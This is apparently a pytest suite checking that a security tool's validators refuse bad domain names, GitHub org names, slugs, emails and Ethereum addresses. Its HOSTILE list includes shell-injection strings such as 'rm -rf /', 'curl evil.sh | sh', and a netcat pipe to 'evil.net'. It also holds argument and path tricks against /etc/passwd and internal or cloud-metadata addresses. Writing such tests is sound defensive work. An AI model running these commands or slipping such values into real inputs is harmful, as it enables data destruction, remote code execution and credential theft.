"""Target names end up in DNS queries, URLs and subprocess input.
Anything that is not plainly a public domain name must be refused."""

from __future__ import annotations

import pytest

from perimeterwatch.core.errors import ValidationError
from perimeterwatch.safety.domains import (
    in_scope,
    registrable_domain,
    validate_domain,
    validate_email,
    validate_eth_address,
    validate_github_org,
    validate_slug,
)

HOSTILE = [
    "",
    " ",
    "acme.xyz; rm -rf /",
    "acme.xyz && curl evil.sh | sh",
    "acme.xyz | nc evil.net 1",
    "$(whoami).acme.xyz",
    "`id`.acme.xyz",
    "acme.xyz\nevil.net",
    "acme.xyz\r\nHost: evil.net",
    "acme.xyz\x00.evil.net",
    "-oProxyCommand=evil.acme.xyz",
    "--config=/etc/passwd",
    "-acme.xyz",
    "acme-.xyz",
    "acme..xyz",
    ".acme.xyz",
    "http://acme.xyz",
    "https://acme.xyz/path",
    "acme.xyz/path",
    "acme.xyz:8080",
    "user@acme.xyz",
    "acme.xyz?x=1",
    "acme.xyz#frag",
    "*.acme.xyz",
    "acme.xyz,evil.net",
    "acme xyz",
    "'acme.xyz'",
    '"acme.xyz"',
    "acme.xyz%00",
    "../../etc/passwd",
    "a" * 64 + ".xyz",
    ".".join(["a" * 60] * 5) + ".xyz",
    "x" * 400,
    "acme",
    "xyz",
    "127.0.0.1",
    "10.0.0.1",
    "169.254.169.254",
    "[::1]",
    "::1",
    "2130706433",
    "0x7f000001",
    "acme.123",
    "localhost",
    "db.localhost",
    "printer.local",
    "vault.internal",
    "router.lan",
    "1.0.0.127.in-addr.arpa",
    "something.onion",
    "example.com",
    "www.example.org",
    "_dmarc.acme.xyz",
    "acme.notarealtld",
]


@pytest.mark.parametrize("raw", HOSTILE)
def test_hostile_input_is_refused(raw: str) -> None:
    with pytest.raises(ValidationError):
        validate_domain(raw)


@pytest.mark.parametrize(
    ("raw", "expected"),
    [
        ("acme-protocol.xyz", "acme-protocol.xyz"),
        ("  Acme-Protocol.XYZ.  ", "acme-protocol.xyz"),
        ("app.acme-protocol.xyz", "app.acme-protocol.xyz"),
        ("acme.co.uk", "acme.co.uk"),
        ("bücher.de", "xn--bcher-kva.de"),
        ("1inch.io", "1inch.io"),
    ],
)
def test_real_domains_are_accepted(raw: str, expected: str) -> None:
    assert validate_domain(raw) == expected


def test_non_text_is_refused() -> None:
    with pytest.raises(ValidationError):
        validate_domain(None)  # type: ignore[arg-type]


def test_registrable_domain() -> None:
    assert registrable_domain("a.b.acme.co.uk") == "acme.co.uk"
    assert registrable_domain("acme.xyz") == "acme.xyz"


@pytest.mark.parametrize(
    ("host", "expected"),
    [
        ("acme.xyz", True),
        ("app.acme.xyz", True),
        ("APP.ACME.XYZ.", True),
        ("notacme.xyz", False),
        ("acme.xyz.evil.net", False),
        ("evilacme.xyz", False),
        ("xyz", False),
    ],
)
def test_scope_cannot_be_escaped_by_lookalike_suffixes(host: str, expected: bool) -> None:
    assert in_scope(host, "acme.xyz") is expected


@pytest.mark.parametrize(
    "raw", ["-acme", "acme-", "ac--me", "acme/../x", "acme org", "a" * 40, "", "acme;ls", "--org"]
)
def test_bad_github_org(raw: str) -> None:
    with pytest.raises(ValidationError):
        validate_github_org(raw)


def test_good_github_org() -> None:
    assert validate_github_org("acme-protocol") == "acme-protocol"


@pytest.mark.parametrize("raw", ["", "-x", "a/b", "a b", "a;b", "../x", "x" * 80])
def test_bad_slug(raw: str) -> None:
    with pytest.raises(ValidationError):
        validate_slug(raw)


def test_email_must_belong_to_the_domain() -> None:
    assert validate_email("Ana@Acme.xyz", root_domain="acme.xyz") == "ana@acme.xyz"
    assert validate_email("ana@mail.acme.xyz", root_domain="acme.xyz") == "ana@mail.acme.xyz"
    for bad in ("ana@gmail.com", "ana@evilacme.xyz", "ana", "a@b@acme.xyz", "ana @acme.xyz"):
        with pytest.raises(ValidationError):
            validate_email(bad, root_domain="acme.xyz")


def test_eth_address_checksum() -> None:
    good = "0x5aAeb6053F3E94C9b9A09f33669435E7Ef1BeAed"
    assert validate_eth_address(good) == good
    assert validate_eth_address(good.lower()) == good
    with pytest.raises(ValidationError):
        validate_eth_address(good[:-1] + "D")  # one wrong-case character
    for bad in ("0x123", "5aAeb6053F3E94C9b9A09f33669435E7Ef1BeAed", "0x" + "g" * 40, ""):
        with pytest.raises(ValidationError):
            validate_eth_address(bad)
